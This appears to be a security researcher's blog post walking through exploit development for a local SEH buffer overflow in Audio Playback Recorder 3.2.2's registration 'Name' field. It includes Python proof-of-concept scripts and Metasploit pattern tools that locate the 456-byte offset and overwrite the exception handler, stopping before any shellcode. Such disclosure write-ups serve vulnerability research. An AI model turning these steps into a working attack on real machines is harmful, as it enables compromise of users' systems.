---
layout: post
title: Audio Playback Recorder 3.2.2 - Local Buffer Overflow (SEH)
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

#### Audio Playback Recorder 3.2.2 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter “License Name” within the registration in the bootup.

##### Initial PoC:

```terma
import struct

buffer = "A" * 500

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Once the exploit is run, the payload is copied into the clipboard.

##### In order to exploit the application, press "Go".

![](/assets/img/Findings11/1.png)

##### Press on the button "Register".

![](/assets/img/Findings11/2.png)

##### Paste the contents of the payload on the parameter "Name".

![](/assets/img/Findings11/3.png)

###### Response of the SEH Chain.

![](/assets/img/Findings11/4.png)

###### Creating a parameter with msf-pattern_create

```term
root@whitecr0wz:~# msf-pattern_create -l 500 
...
```

##### This pattern is pasted into the parameter "Name".

![](/assets/img/Findings11/5.png)

##### Response of the SEH Chain II

![](/assets/img/Findings11/6.png)

##### Obtaining the offset with the use of msf-pattern_offset.

```term
root@whitecr0wz:~# msf-pattern_offset -q 41327041 
[*] Exact match at offset 456
root@whitecr0wz:~# 
```

###### Current PoC:

```term
import struct

buffer = "A" * 456 + "BBBB" + "CCCC"

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Response of the SEH Chain III

![](/assets/img/Findings11/7.png)

##### Enumerating the modules.

![](/assets/img/Findings11/8.png)


![](/assets/img/Findings11/11-proof.gif)
